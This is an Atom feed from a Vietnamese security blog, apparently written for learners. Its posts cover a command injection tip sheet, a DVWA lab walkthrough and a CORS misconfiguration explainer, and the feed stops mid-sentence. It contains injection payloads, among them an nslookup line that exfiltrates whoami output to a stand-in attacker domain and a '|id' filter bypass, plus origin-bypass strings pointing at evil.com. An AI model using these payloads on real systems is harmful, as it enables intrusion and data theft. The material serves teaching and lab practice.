<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hydrasky</title>
  
  <subtitle>Cyber Security</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://blog.hydrasky.ml/"/>
  <updated>2020-11-29T05:00:00.000Z</updated>
  <id>http://blog.hydrasky.ml/</id>
  
  <author>
    <name>Le Binh An</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Command Injection TIP</title>
    <link href="http://blog.hydrasky.ml/2020/11/29/OS%20command%20Injection/"/>
    <id>http://blog.hydrasky.ml/2020/11/29/OS command Injection/</id>
    <published>2020-11-29T05:00:00.000Z</published>
    <updated>2020-11-29T05:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>Một số hàm API được sử để giao tiếp với hệ điều hành có thể tiềm tàng nguy cơ bị injection nếu sử dụng:</p><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><ul><li>Runtime.exec()<h3 id="C-C"><a href="#C-C" class="headerlink" title="C/C++"></a>C/C++</h3></li><li>system</li><li>exec</li><li>ShellExecute</li><li>ShellExecuteForExplore</li><li>Shell<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3></li><li>exec</li><li>eval</li><li>os.system</li><li>os.popen</li><li>subprocess.popen</li><li>subprocess.call</li><li>execfile</li><li>input<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3></li><li>passthru</li><li>popen</li><li>curl_exec</li><li>curl_multi_exec</li><li>pcntl_exec</li><li>system</li><li>shell_exec</li><li>exec</li><li>proc_open</li><li>eval<h2 id="Net"><a href="#Net" class="headerlink" title=".Net"></a>.Net</h2></li><li>Process.Start<h2 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h2>child_process.exec</li></ul><p>Một số ký tự có chức năng như dấu phân cách giữa các lệnh, cho phép các lệnh được xâu chuỗi lại với nhau. Các dấu phân tách lệnh sau hoạt động trên cả hệ thống dựa trên Windows và Uni</p><ul><li>&amp;</li><li>&amp;&amp;</li><li>|</li><li>||<br>Một số chỉ sử dụng trên Unix:</li><li>;</li><li>Xuống dòng (0x0a or \n)</li></ul><p>Sử dụng để thực hiện câu lệnh kép: “echo $(ls) “= “ls”</p><ul><li><code></code> </li><li>$( injected command )</li></ul><p>Một số thử thuật để khai thác hay kiểm tra lỗ hổng Blind OS Command Injection:</p><ul><li><p>Gửi mail bằng command</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mail -s &quot;This site is great&quot; -aFrom:peter@normal-user.net feedback@vulnerable-website.com</span><br></pre></td></tr></table></figure></li><li><p>Sử dụng ping để thử qua độ trễ của reponse</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; ping -c 10 127.0.0.1 &amp;</span><br></pre></td></tr></table></figure></li><li><p>Chuyển hướng đầu ra qua một kiểu xuất dữ liệu, như tạo 1 file </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; whoami &gt; &#x2F;var&#x2F;www&#x2F;static&#x2F;whoami.txt &amp;</span><br></pre></td></tr></table></figure></li><li>Sử dụng kĩ thuật OAST - dữ liệu được truy xuất bằng một kênh khác<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp; nslookup kgji2ohoyw.web-attacker.com &amp;</span><br><span class="line">&amp; nslookup $(whoami).kgji2ohoyw.web-attacker.com &amp;</span><br></pre></td></tr></table></figure></li></ul><h3 id="Payload-de-thuc-hien-fuzz"><a href="#Payload-de-thuc-hien-fuzz" class="headerlink" title="Payload để thực hiện fuzz:"></a>Payload để thực hiện fuzz:</h3><ul><li><a href="https://github.com/payloadbox/command-injection-payload-list">https://github.com/payloadbox/command-injection-payload-list</a></li><li><a href="https://hackersonlineclub.com/command-injection-cheatsheet/">https://hackersonlineclub.com/command-injection-cheatsheet/</a></li><li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection</a></li></ul><h3 id="Tham-khao-kien-thuc"><a href="#Tham-khao-kien-thuc" class="headerlink" title="Tham khảo kiến thức"></a>Tham khảo kiến thức</h3><ul><li><a href="https://portswigger.net/web-security/os-command-injection">https://portswigger.net/web-security/os-command-injection</a></li><li><a href="https://github.com/PortSwigger/command-injection-attacker">https://github.com/PortSwigger/command-injection-attacker</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Một số hàm API được sử để giao tiếp với hệ điều hành có thể tiềm tàng nguy cơ bị injection nếu sử dụng:&lt;/p&gt;
&lt;h3 id=&quot;Java&quot;&gt;&lt;a href=&quot;#Java&quot;
      
    
    </summary>
    
    
      <category term="BugBoutyTip" scheme="http://blog.hydrasky.ml/tags/BugBoutyTip/"/>
    
  </entry>
  
  <entry>
    <title>DVWA (OWASP)</title>
    <link href="http://blog.hydrasky.ml/2020/11/28/DVWA-Part1/"/>
    <id>http://blog.hydrasky.ml/2020/11/28/DVWA-Part1/</id>
    <published>2020-11-28T05:00:00.000Z</published>
    <updated>2020-11-28T05:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>TL;DR:<br>Damn Vulnerable Web Application (DVWA) là một ứng dụng mã nguồn PHP/MySQL tập hợp sẵn các lỗi logic về bảo mật ứng dụng web trong mã nguồn PHP. Lỗi logic khi lập trình có thể áp dụng đối với các loại ngôn ngữ lập trình nhằm giảm thiểu khả năng tạo ra lổ hổng bảo mật từ tư duy lập trình chưa cẩn thận. Bản thân mk thấy DVWA rất thích hợp cho các bạn nào mới bắt đầu với pentest web. Các bạn nên hoàn thành và hiểu nó trong những bước đầu nha. </p><p>Xin chào tất cả các bạn hôm nay mình quay lại với series phân tích các lỗ hổng trong các bài lab của DVWA. Để giải hầu hết các bài lab này các bạn có thể tìm thấy solution ở rất nhiều nơi như blog, youtube nhưng hầu như không ai giải thích nguyên nhân cụ thể của lỗ hổng và tại sao lại dùng payload như vậy.<br>Đối với người mới thì như vậy là cách học rất là mù mịt và máy móc. Do đó hôm nay sẽ viết series này chủ yếu để giải thích cho các bạn hiểu về lỗ hổng và cách khai thác chứ không chỉ chăm chú vào kết quả cuối cùng. Okie vào từng phần thôi nào ! À sẽ có những lỗi cơ bản nên mình xin phép sẽ không nói nhiều nha!.</p><h2 id="Brute-force"><a href="#Brute-force" class="headerlink" title="Brute force"></a>Brute force</h2><p>Đây là một lỗ hổng rất dễ hiểu và khai thác, căn bản nó như kiểu không có “rate limited” - giói hạn request ,cho phép attacker gửi request liên tục mà không có bất cứ cơ chế chặn nào. Nghe thì dường như chẳng có xấu xa gì nhưng nó lại bàn đạp để leo thang thành nhiều lỗ hổng khác như chiếm tài khoản qua brute force password, mã otp ; spam ; DOS ; liệt kê danh sách bí mật … Do đó brute force vẫn luôn được coi là một lỗ hổng đáng để quan tâm.</p><p>Trong DVWA, bài lab sử dụng lỗ hổng này để  chiếm tài khoản với 4 mức easy, medium , high và Impossible .<br><img src="/images/DVWA/bruteforce1.png" class="[class names]" title="[500] [500] " alt="title text"></p><h4> Level Easy + Medium </h4> <img src="/images/DVWA/bruteforce2.png" class="[class names]" title="[500] [500] " alt="Easy lab"><p>Đầu tiên ta có thể thấy 2 lỗ hỗng là SQL injection và Bruteforce nhưng ở đây ta chỉ cần quan tâm đến BF thui. Điều dễ thấy ở đây là phần “check the database “ đã gửi đi query và chẳng có gì để giới hạn request cả lúc này chỉ đơn là sử dụng 1 công cụ nào đó để bruteforce các username và password có thể .</p><p>Chuyển sang Medium thì cũng không có gì thêm ngoại việc bổ sung hàm loại bỏ các kí tự đặc biệt trong giá trị truyền vào (mysqli_real_escape_string) của usernamr và password để chặn SQLi. Do đó vẫn brute force bình thường.</p><img src="/images/DVWA/bruteforce3.png" class="[class names]" title="[500] [500] " alt="Medium lab"><h4> Level High </h4><p>Mức này bổ sung thêm 1 chút an toàn đó là csrf token </p><img src="/images/DVWA/bruteforce5.png" class="[class names]" title="[500] [500] " alt="High lab"><p>và check nó bằng hàm checkToken()- hàm này tự tạo không có trong thư viện nào của PHP.</p><img src="/images/DVWA/bruteforce4.png" class="[class names]" title="[500] [500] " alt="High lab"><img src="/images/DVWA/bruteforce6.png" class="[class names]" title="[500] [500] " alt="High lab"><p>Hàm này sẽ kiểm tra các giá trị “user_token”- trên URL và “session_token”-trong cookie của request nhận được nếu 2 giá trị này bằng nhau thì request này mới được coi là hợp còn không sẽ redirect về trang “index.php”.<br>Qúa dởm đúng không các bạn (^^) , csrftoken không xác thực lại đi xác thực cái mẹ gì ko ?<br>Điều này rất dễ bypass bằng cách attacker chỉ cần cho giá trị của user_token là bất kì và thêm vào cookie một field là session_token với giá trị là user_token vừa đặt là xong.Thế là bạn lại tiếp tục có thể bruteforce.</p><h4> Level Impossible </h4> <p>Đúng với cái tên, Mức này thực chât không phải để chúng ta khai thác mà là cho chúng ta thấy cách lập trình an toàn đầy đủ để phòng tránh lỗ hổng này. O đây ta có thể thấy họ đã bổ sung thêm một số an toàn như sau:</p><img src="/images/DVWA/bruteforce7.png" class="[class names]" title="[500] [500] " alt="Impossible lab"><p> Các giá trị đếm số lần đăng nhập sai, thời gian khóa tài khoản , tài khoản có bị khóa hay không và hàm kiểm tra các giá trị đó.</p> <img src="/images/DVWA/bruteforce8.png" class="[class names]" title="[500] [500] " alt="High lab"><p>Bên canh đó còn sét thời gian trễ sau mỗi lần đăng nhập sai và cập nhật vào cơ sỡ dữ liệu ngay.<br>… (Bạn nên tự đọc thêm sourcecode mức này dể hiểu)</p><p>Ngoài ra bạn có thể tự thêm tính năng hủy session sau một khoảng thời gian cũng là một biện pháp hay …</p><p>##Command Injection</p><p>Command injection là một lỗ hổng rất là nghiêm trọng , thuộc các lỗ hổng của RCE,  attacker có thể chèn các payload là các câu lệnh của hệ thống thông qua các đầu vào và thực thi nó từ xa. Bạn có  thể nhầm lẫn với một họ hàng của nó là Code Injection nhưng thực chất là nó khác nhau đó. Nhưng chỉ cần hiểu đơn giản là command chỉ chèn lệnh còn Code thì chèn code (function). Lỗ hổng này xảy ra do phần xử lí phía backend, với các ngôn ngữ có thể giao tiếp với hệ thống như PHP, JAVA, PYTHON …. và bất cứ hệ điều hành nào Windows/Linux/Unix/Mac</p><img src="/images/DVWA/cmdinjecton1.png" class="[class names]" title="[500] [500] " alt=" "><p>O trong bài lab này chúng ta sẽ thực hiện khai thác lỗ hổng này trên Linux Server và ngôn ngữ được sử dụng lúc này là PHP. Bổ sung thêm cho mọi người luôn là PHP cung cấp rất nhiều hàm để thực thi lệnh trên hệ thống như system|exec|shell_exec|passthru|proc_open|popen|curl_exec|curl_multi_exec|parse_ini_file|show_source.</p><h4> Level Easy + Medium </h4><img src="/images/DVWA/cmdinjecton2.png" class="[class names]" title="[500] [500] " alt=" "><p>Nêu như bạn hiểu được đoạn code này thì thấy nó rất dễ để khai thác</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$target &#x3D; $_REQUEST[ &#39;ip&#39; ] &#x3D;&gt; shell_exec( &#39;ping  &#39; . $target ) &#x3D;&gt; RCE</span><br></pre></td></tr></table></figure><p>Hàm shell_exec() [giống như exec() nhưng nó trả về dữ liệu dạng string] thực thi cấu lênh “ ping [input] “và trả về kết quả. Lúc này chúng ta có thê thấy họ truyền trực tiếp giá trị của “IP” vào “ping [IP]” như vậy phải tìm cách chèn thêm câu lệnh thông qua “input” đó và hệ điều hành cung cho phép thực thi câu lệnh trong 1 lần nhập (ping 8.8.8.8 &amp;&amp; whoami) bằng rất nhiều cách như  :</p><ul><li>Nối 2 câu lệnh bằng  <ul><li>&amp;</li><li>&amp;&amp;</li><li>|</li><li>||</li></ul></li><li>Trên hệ điều hành Unix có thể sử dụng :<ul><li>;</li><li>Xuống dòng (0x0a or \n)</li></ul></li></ul><img src="/images/DVWA/cmdinjecton3.png" class="[class names]" title="[500] [500] " alt=" "><p>Okie như vậy chắc chắn bạn đã hiểu cách để khai thác các bài lab như này rồi đúng không !</p><img src="/images/DVWA/cmdinjecton4.png" class="[class names]" title="[500] [500] " alt=" "><p>Đối với những bài hay như này bạn có thể enable PHPIDS để tăng thêm phần khó và kịch tính để tăng level của bạn.</p><h4> Level Medium </h4><br>Mức này họ thêm blacklist để loại bỏ các kí tự đặc biệt để chèn thêm command nhưng như bạn thấy nó vẫn thiếu quá nhiều do đó bạn chỉ cần dùng các kí tự không nằm trong black là bypass được hoặc sử dụng cách encode kí tự là xong.<br><br><img src="/images/DVWA/cmdinjecton5.png" class="[class names]" title="[500] [500] " alt=" "><br><br><h4> Level High </h4><p>O mức này nhìn thấy danh sách có vẻ đầy đủ đó nhưng lại bị sai 1 thứ :<br><img src="/images/DVWA/cmdinjecton6.png" class="[class names]" title="[500] [500] " alt=" "></p><p>Dễ như ăn cơm , bh chúng ta chỉ cần sử dụng payload “|id” - Ko dấu cách nha!!!! Done</p><img src="/images/DVWA/cmdinjecton7.png" class="[class names]" title="[500] [500] " alt=" "><h4> Level Impossible </h4><p>Chúng ta cùng xem cách lập trình an toàn cho bài này như thế nào nha</p><img src="/images/DVWA/cmdinjecton8.png" class="[class names]" title="[500] [500] " alt=" "><ul><li>Họ đã sử dụng hàm stripslashes() để lọc các kí tự gạch chéo trong giá trị truyền vào ,ví dụ “C:\user\config.php” =&gt; “C:userconfig.php”</li><li>Sử dụng hàm explode() để phân tách chuỗi giá trị đầu vào theo dấu “.” ( Giống với preg_split nhưng không linh hoạt bằng ) thành một mảng các giá trị và tiến hành kiểm tra xem có phải là các số hay không “is_numeric()” ? Nhưng vậy là đã tránh được việc truyền các câu lệnh bằng chữ rồi và cũng chẳng có câu lệnh nào là toàn số cả trừ khi bạn thiết lập thành alias.</li></ul><p>Đây là cách fix nhưng mình thấy cơ bản thì chỉ ap dụng cho bài này chứ thực tế để ngăn chặn command injection thì sẽ cần phải mở rộng hơn.</p><p>##CSRF</p><p>CSRF ( Cross Site Request Forgery) là kĩ thuật tấn công bằng cách sử dụng quyền chứng thực của người sử dụng đối với 1 website khác. Các ứng dụng web hoạt động theo cơ chế nhận các câu lệnh HTTP từ người sử dụng, sau đó thực thi các câu lệnh này. Mk có viêt một bài riêng về lỗ hổng này các bạn có thể tham khảo. Lỗ hổng này thường ở các yêu cầu submit hoặc API, mức độ nguy hiểm thì cũng tùy thuộc vào target mà request hướng đến.Nguy hiểm nhất vẫn thường là dùng để chiếm tài khoản, chuyển tiền, yêu cầu xác thực …</p><img src="/images/DVWA/csrf1.png" class="[class names]" title="[500] [500] " alt=" "><p>Trong bài lab lần này ta sẽ cố gắng chiếm tài khoản của admin  bằng cách đổi password thông qua lỗ hổng CSRF. Những ai hểu lỗ hổng này rồi sẽ biêt cách khai thác ngay lập tức còn chưa thì lên đọc qua tài liệu chứ mình sẽ không giải thích cụ thể trong bài viết này đâu .</p><ul><li>Level Low dễ quá rồi không cơ chế an toàn nào ở đây cả nên mk không giải thích cách khai thác nữa.</li><li><p>Sang level Medium, thì có bổ sung thêm check HTTP referer - <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer">Header của HTTP request</a> , cách này trước đây khá hay dùng nhưng bh thì không vì nó quá dễ để bypass. Nó tiến hành kiểm tra xem giá trị của 2 header “Host” và “Referer” có giống nhau hay không? </p><img src="/images/DVWA/csrf2.png" class="[class names]" title="[500] [500] " alt=" "></li><li><p>Level High, giống hệt bài bruteforce 3 đó là sử dụng hàm checkToken() lởm </p><img src="/images/DVWA/csrf3.png" class="[class names]" title="[500] [500] " alt=" "></li></ul><h4>Level Impossible</h4><p>Cách ngăn chặn CSRF trong đổi mật khẩu tốt nhất bây giờ mình thấy đó vẫn là sử dụng xác thực bằng mật khẩu cũ, Sử dụng CSRFtoken cũng là một cách hay nhưng đôi khi lại lỗi trong việc lập trình dẫn đến unsecure flow.<br>Việc sủ dụng mật khẩu cũ kết hợp với CSRF Token để xác thực ngày nay giống như một tiêu chuẩn được đề ra vậy.</p><img src="/images/DVWA/csrf4.png" class="[class names]" title="[500] [500] " alt=" ">]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;TL;DR:&lt;br&gt;Damn Vulnerable Web Application (DVWA) là một ứng dụng mã nguồn PHP/MySQL tập hợp sẵn các lỗi logic về bảo mật ứng dụng web tro
      
    
    </summary>
    
    
      <category term="Lab" scheme="http://blog.hydrasky.ml/tags/Lab/"/>
    
  </entry>
  
  <entry>
    <title>Cross-Origin Resource Sharing</title>
    <link href="http://blog.hydrasky.ml/2020/07/23/CORS/"/>
    <id>http://blog.hydrasky.ml/2020/07/23/CORS/</id>
    <published>2020-07-23T04:00:00.000Z</published>
    <updated>2020-07-23T04:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p> TL;DR<br> Trước khi nói về C0RS, Mk muốn nói lại một chút về Cross-Origin access. Như trong phần trước về SOP mình cũng đã trình bày, việc các request đến các tài nguyên giữa các nguồn (Origin ) khác nhau được gọi là Cross-Origin.</p><p> Ví dụ, web hydrasky.ml tạo một request lấy ảnh từ web hydrasky.com</p><p>Vì lý do bảo mật, các trình duyệt hạn chế cho phép Cross-Origin bằng chính sách cùng nguồn gốc (SOP). Nhưng cái gì cũng có ngoại lệ, trong một số trường hợp bạn muốn chia sẻ các dữ liệu cho các Origin tin cậy thì bạn có thể sử dụng CORS để làm điều này.Tuy nhiên, nó lại mở cánh cửa cho một số cuộc tấn công dựa Cross-Origin nếu chính sách CORS của trang web được cấu hình và triển khai kém. Ok chúng ta cùng tìm hiểu sâu nào !</p><h2 id="CORS-la-gi"><a href="#CORS-la-gi" class="headerlink" title="CORS là gì ?"></a>CORS là gì ?</h2><p> CORS viết tắt của Cross-Origin Resource Sharing, là một cơ chế của trình duyệt cho phép truy cập có kiểm soát vào các tài nguyên nằm ở các Origin khác nhau. Bởi vì có chính sách cùng nguồn gốc (SOP) nên mới sinh ra CORS, nó giúp mở rộng và thêm tính linh hoạt cho SOP.</p><h2 id="Cach-CORS-lam-viec"><a href="#Cach-CORS-lam-viec" class="headerlink" title="Cách CORS làm việc ?"></a>Cách CORS làm việc ?</h2><p>Sẽ có 2 kịch bản chính có khả năng xảy ra để xem cách CORS hoạt động. Trong các ví dụ dưới đây sẽ sử dụng XMLHttpRequest để thực hiện gửi request , môi trường thực hiện sẽ là chung, không phân biệt các trình duyệt nào.</p><h4 id="Kich-ban-1-Request-don-gian"><a href="#Kich-ban-1-Request-don-gian" class="headerlink" title="Kịch bản 1: Request đơn giản"></a>Kịch bản 1: Request đơn giản</h4><p> Một request đơn giản ở đây phải đầy đủ các điều kiện sau :</p><ul><li>Sử dụng một trong các phương thức sau :<ul><li>GET</li><li>POST</li><li>HEAD</li></ul></li><li>Ngoài các header được đặt tự động bởi các tác nhân như Connection , User-Agent hay các header nằm trong danh sách các <a href="https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name#:~:text=A%20forbidden%20header%20name%20is,retains%20full%20control%20over%20them.">Forbidden header name</a> cho Fetch API thì chỉ cho phép bạn set thủ công các header nằm trong danh sách <a href="https://developer.mozilla.org/en-US/docs/Glossary/CORS-safelisted_request_header">CORS-safelisted request header</a>, ví dụ như :<ul><li>Accept</li><li>Accept-Language</li><li>Content-Language</li><li>Content-Type </li></ul></li><li>Chỉ sử dụng các value sau đây cho Content-Type header:<ul><li>application/x-www-form-urlencoded</li><li>multipart/form-data</li><li>text/plain</li></ul></li><li>Không sử dụng <strong>ReadableStream</strong> object trong request.</li><li>Không có bất kì trình lắng nghe sự kiện nào được đăng ký trên bất kỳ  <strong>XMLHttpRequestUpload</strong> object nào được sử dụng trong request.</li></ul><p>Ví dụ : Trên <a href="https://hydrasky.ml/">https://hydrasky.ml</a> thực hiện một reuqest đơn giản đến hydrasky.com </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">const xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">const url &#x3D; &#39;https:&#x2F;&#x2F;hydrasky.com&#x2F;resources&#x2F;public-data&#x2F;&#39;;  </span><br><span class="line">xhr.open(&#39;GET&#39;, url);</span><br><span class="line">xhr.onreadystatechange &#x3D; someHandler;</span><br><span class="line">xhr.send(); </span><br></pre></td></tr></table></figure><p>Điều này sẽ thực hiện một trao đổi đơn giản giữa máy khách và máy chủ, CORS sẽ xử lí như sau:</p><img src="/images/CORS/simple-req-updated.png" class="[class names]" title="[500] [500] " alt="title text"><p>Phía Client (Browser) sẽ gửi một GET request đến tài nguyền của một ORIGIN nào đó trên server , Origin header được đính kèm với request để nói cho server biết nơi đang yêu cầu tải tài nguyên đó.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Origin: https:&#x2F;&#x2F;foo.example</span><br></pre></td></tr></table></figure><p>Khi CORS được kích hoạt, nếu nhận được một request đơn giản thì Server sẽ phản hồi về với <strong>Access-Control-Allow-Origin</strong> header.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: *</span><br></pre></td></tr></table></figure><p>Nếu value là *<em>“ * “*</em> như ở trên thì điểu đó có nghĩa là tài nguyên đó có thể được yêu cầu bởi bất kì ORIGIN nào. Nếu như bạn muốn chỉ cho phép một ORIGIN cụ thể nào đó thì có thể set :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: https:&#x2F;&#x2F;foo.example</span><br></pre></td></tr></table></figure><p>Như vậy sẽ an toàn hơn.</p><h4 id="Kich-ban-2-Preflighted-Request"><a href="#Kich-ban-2-Preflighted-Request" class="headerlink" title="Kịch bản 2: Preflighted Request"></a>Kịch bản 2: Preflighted Request</h4><p>Preflighted có nghĩa là “được chiếu trước”, nếu dùng tên tiếng việt thì nghe không xuôi lắm đúng không các bạn vì vậy mình sẽ để nguyên là Preflighted Request. Việc “ Chiếu trước “ ở đây là nó ám chỉ việc browser gửi một <strong>OPTIONS</strong> request để hỏi thăm trước khi thực hiện request sau đó. Tại sao lại như vậy ?</p><p>Đầu tiên bạn cần phải biết,để Prefighted request thì bao gồm những điều kiện gì :</p><img src="/images/CORS/CORS1.png" class="[class names]" title="[500] [500] " alt="title text"><p>Một ví dụ request dưới đây sẽ được Preflighted  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">const xhr &#x3D; new XMLHttpRequest();</span><br><span class="line">xhr.open(&#39;POST&#39;, &#39;https:&#x2F;&#x2F;hydrasky.ml&#x2F;resources&#x2F;post-here&#x2F;&#39;);</span><br><span class="line">xhr.setRequestHeader(&#39;X-PINGOTHER&#39;, &#39;pingpong&#39;);</span><br><span class="line">xhr.setRequestHeader(&#39;Content-Type&#39;, &#39;application&#x2F;xml&#39;);</span><br><span class="line">xhr.onreadystatechange &#x3D; handler;</span><br><span class="line">xhr.send(&#39;&lt;person&gt;&lt;name&gt;Arun&lt;&#x2F;name&gt;&lt;&#x2F;person&gt;&#39;);</span><br></pre></td></tr></table></figure><p>Nhìn vào ví dụ có thể thấy, <strong>Conttent-Type</strong> được đặt là <strong>application/xml</strong> và một header tự tạo là <strong>X-PINGOTHER</strong> được set trong request ==&gt;  <strong>Preflighted</strong>.</p><p>Điều này sẽ thực hiện một cuộc thăm dò giữa máy khách và máy chủ, CORS sẽ xử lí như sau:</p><img src="/images/CORS/CORS2.png" class="[class names]" title="[500] [500] " alt="title text"><p>Đầu tiên trình , Browser sẽ tiến hành gửi <strong>OPTIONS</strong> request với các header được đính kèm trong POST request được thiết lập. Server sẽ gửi lại các thông tin về các thành phần trong header được cho phép thông qua <strong>Response</strong> với các Response header sau :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http:&#x2F;&#x2F;foo.example</span><br><span class="line">Access-Control-Allow-Methods: POST, GET, OPTIONS</span><br><span class="line">Access-Control-Allow-Headers: X-PINGOTHER, Content-Type</span><br><span class="line">Access-Control-Max-Age: 86400</span><br></pre></td></tr></table></figure><p>Browser sẽ tiếng hành kiểm tra request đã được thiết lập, nếu request hợp lệ sẽ gửi nó tới Server.</p><p>Mục đích chính của Prefligted là để xác định xem yêu cầu thực tế có an toàn để gửi hay không, vì một số yêu cầu từ các ORIGIN khác có thể liên quan đến dữ liệu người dùng. </p><h2 id="Cac-lo-hong-phat-sinh-tu-cac-van-de-cau-hinh-CORS"><a href="#Cac-lo-hong-phat-sinh-tu-cac-van-de-cau-hinh-CORS" class="headerlink" title="Các lỗ hổng phát sinh từ các vấn đề cấu hình CORS"></a>Các lỗ hổng phát sinh từ các vấn đề cấu hình CORS</h2><h4 id="1-Serve-tao-Access-Control-Allow-Origin-tu-Origin-header-cua-client-chi-dinh-vi-du"><a href="#1-Serve-tao-Access-Control-Allow-Origin-tu-Origin-header-cua-client-chi-dinh-vi-du" class="headerlink" title="1. Serve tạo Access-Control-Allow-Origin từ  Origin header của client chỉ định,ví dụ :"></a>1. Serve tạo <strong>Access-Control-Allow-Origin</strong> từ  Origin header của client chỉ định,ví dụ :</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;sensitive-victim-data HTTP&#x2F;1.1</span><br><span class="line">Host: hydrasky.ml</span><br><span class="line">Origin: https:&#x2F;&#x2F;malicious-website.com</span><br><span class="line">Cookie: sessionid&#x3D;...</span><br></pre></td></tr></table></figure><p>Phản hồi từ Server:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Access-Control-Allow-Origin: https:&#x2F;&#x2F;malicious-website.com</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>Điều này tương đương với việc bạn cấu hình phản hồi mặc định “Access-Control-Allow-Origin: * ,nó đều cho phép các quyền “read” cross-origin từ malicious-website.com đến hydrasky.ml.Và bạn để ý một chút nữa đó là việc bạn cấu hình “Access-Control-Allow-Credentials: true”- cho phép gửi cookie đính kèm, thì vấn đề lộ thông tin các nhân, bí mật sẽ còn lớn hơn nếu phía malicious-website.com thực hiện các request cần xác thực người dùng.</p><h4 id="2-Loi-phan-tich-Origin-header"><a href="#2-Loi-phan-tich-Origin-header" class="headerlink" title="2. Lỗi phân tích Origin header"></a>2. Lỗi phân tích Origin header</h4><p>   Mặc dù bạn đã cấu hình chỉ cho phép truy cập giữa các domain được chỉ định ,tạo ra môt whitelist các origin nhưng cách áp dụng thì lại có vấn đề. Nó thường xuất phát từ các nhu cầu như là cho phép truy cập từ các subdomain hoặc tên miền phụ , thậm chí còn chưa được đăng kí. Để linh hoạt, đỡ tốn thời gian họ  triển khai bằng cách khớp các tiền tố hoặc hậu tố của Orgin như *<em><em>“*hydrasky.ml”</em>*</em> hoặc sử dụng các biểu thức regular expressions nên dễ bị bypass, ví dụ như :</p><p>Ứng dụng cho phép tất cả các domain cùng hậu tố sau được phép truy cập:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydrasky.ml</span><br></pre></td></tr></table></figure><p>Attacker có thể sử dụng các cách như sau :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- blog.hydrasky.ml</span><br><span class="line">- hackerhydrasky.ml</span><br></pre></td></tr></table></figure><p>Ngoài ra thì có thể sử dụng các kí tự đặc biệt </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">,&amp;&#39;&quot;;!$^*()+&#x3D;&#96;~-_&#x3D;|&#123;&#125;%</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; non printable chars</span><br><span class="line">%01-08,%0b,%0c,%0e,%0f,%10-%1f,%7f</span><br></pre></td></tr></table></figure><p>Nhưng một lưu ý là nó còn phụ thuộc vào loại trình duyệt. Tham khảo thêm ở <a href="https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397">đây</a>   </p><pre><code>- .hydrasky.ml!.evil.com - .hydrasky.ml&quot;.evil.com - .hydrasky.ml$.evil.com - .hydrasky.ml%0b.evil.com - .hydrasky.ml%60.evil.com</code></pre><h4 id="3-Whitelist-Origin-chap-nhan-value-la-NULL"><a href="#3-Whitelist-Origin-chap-nhan-value-la-NULL" class="headerlink" title="3. Whitelist Origin chấp nhận value là NULL"></a>3. Whitelist Origin chấp nhận value là NULL</h4><p>Trong một số trường hợp, Browser sẽ gửi giá trị NULL cho Origin header. Kẻ tân công sẽ sử dụng các kĩ thuật như tạo các 